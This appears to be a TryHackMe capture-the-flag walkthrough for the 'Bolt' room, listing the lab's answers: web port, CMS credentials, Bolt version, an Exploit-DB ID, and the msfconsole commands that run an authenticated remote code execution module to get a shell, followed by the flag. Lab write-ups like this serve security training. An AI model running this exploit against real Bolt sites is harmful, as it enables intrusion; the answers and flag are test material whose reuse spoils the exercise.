# Bolt

> John Hammond | August 13th, 2020


-------------------------------

# Task 1 - Deploy the Machine

> This room is designed for users to get familiar with the Bolt CMS and how it can be exploited using Authenticated Remote Code Execution. You should wait for at least 3-4 minutes for the machine to start properly.

> If you have any queries or feedback you can reach me through the TryHackMe Discord server or through Twitter.

## 1. Start the machine

> Start the machine

```
No answer needed
```


# Task 2 - Hack your way into the machine!

> Once you have successfully deployed the VM , enumerate it before finding the flag in the machine.


## 1. What port number has a web server with a CMS running?

> What port number has a web server with a CMS running?

```
8000
```

## 2. What is the username we can find in the CMS?

> What is the username we can find in the CMS?

```
bolt
```

## 3. What is the password we can find for the username?

> What is the password we can find for the username?

```
boltadmin123
```

## 4. What version of the CMS is installed on the server? (Ex: Name 1.1.1)

> What version of the CMS is installed on the server? (Ex: Name 1.1.1)

```
Bolt 3.7.1
```

How should we determine this without guessing...?

## 5. There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

> There's an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What's its EDB-ID?

```
48296
```

Found with `searchsploit`

## 6. Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

> Metasploit recently added an exploit module for this vulnerability. What's the full path for this exploit? (Ex: exploit/....)

```
exploit/unix/webapp/bolt_authenticated_rce
```

## 7. Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

> Set the LHOST, LPORT, RHOST, USERNAME, PASSWORD in msfconsole before running the exploit

```
use exploit/unix/webapp/bolt_authenticated_rce
set LHOST tun0
set RHOST 10.10.56.169
set USERNAME bolt
set PASSWORD boltadmin123
run
```

This will not tell you it finished. You will not have a prompt.

Just try and run commands. 

## 8. Look for flag.txt inside the machine.

> Look for flag.txt inside the machine.

```
cat /home/flag.txt
```

```
THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}
```